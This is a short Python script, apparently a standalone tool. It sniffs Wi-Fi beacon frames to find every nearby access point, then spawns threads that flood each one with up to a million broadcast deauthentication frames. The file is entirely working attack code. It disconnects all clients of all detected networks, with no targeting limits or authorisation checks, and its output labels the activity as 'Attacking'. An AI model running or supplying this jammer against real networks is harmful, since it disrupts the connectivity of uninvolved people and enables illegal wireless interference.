# -*- coding utf-8 -*-
import pyshark
import sys
import time
import threading
from scapy.all import *


def send_deauth_pkt(bssid, send_iface,
                    target='ff:ff:ff:ff:ff:ff', n=1000000):
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=target,
                              addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    for i in range(n):
        sendp(packet, iface=send_iface, verbose=0)
        print 'Attacking(' + bssid + '): Send the Deauthentication flame:)'
    return


def ap_info_extractor(pkt):
    ref = {}
    ref['bssid'] = pkt.wlan.bssid
    ref['type'] = pkt.wlan.fc_type
    ref['subtype'] = pkt.wlan.fc_type_subtype
    ref['addr'] = pkt.wlan.addr
    ref['channel'] = pkt.wlan_radio.channel
    ref['frequency'] = pkt.wlan_radio.frequency
    ref['signal'] = pkt.wlan_radio.signal_dbm
    ref['data_rate'] = pkt.wlan_radio.data_rate
    ref['phy'] = pkt.wlan_radio.phy
    return ref


if __name__ == '__main__':
    recv_iface = 'wlan0'
    send_iface = 'wlan1'
    cap = pyshark.LiveCapture(display_filter="wlan.fc.type_subtype == 0x0008",
                              interface=recv_iface)
    tab = []
    for num, packets in enumerate(cap):
        data = ap_info_extractor(packets)
        data['num'] = num
        bid = data['bssid']
        if bid in tab:
            pass
        else:
            tab.append(bid)
            sending_thread = threading.Thread(target=send_deauth_pkt,
                                              args=(bid, send_iface,))
            sending_thread.start()
        tab = list(set(tab))
